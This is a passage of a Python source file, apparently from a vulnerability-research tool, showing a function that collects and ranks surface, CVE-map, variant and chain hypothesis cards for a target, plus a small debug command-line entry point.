    cards = []
    if "surface" in kinds:
        cards += surface_hypotheses(state, target, url)
    if "cve-map" in kinds:
        cards += cve_hypotheses(state, target)
    if "variant" in kinds:
        cards += variant_hypotheses(state, target)
    if "chain" in kinds:
        cards += chain_hypotheses(state, target)
    cards = rank(cards, state)
    return {"target": target, "cards": cards,
            "brief": model_brief(cards, target)}


def main(argv=None) -> int:  # pragma: no cover - thin debug entry
    import argparse
    import tempfile
    p = argparse.ArgumentParser(description="hypothesis engine (debug entry)")
    p.add_argument("campaign")
    a = p.parse_args(argv)
    state = load_state(Path(a.campaign))
    out = generate(state, Path(a.campaign).name)
    print(json.dumps(out, indent=2)[:4000])
    return 0


if __name__ == "__main__":  # pragma: no cover
    raise SystemExit(main())
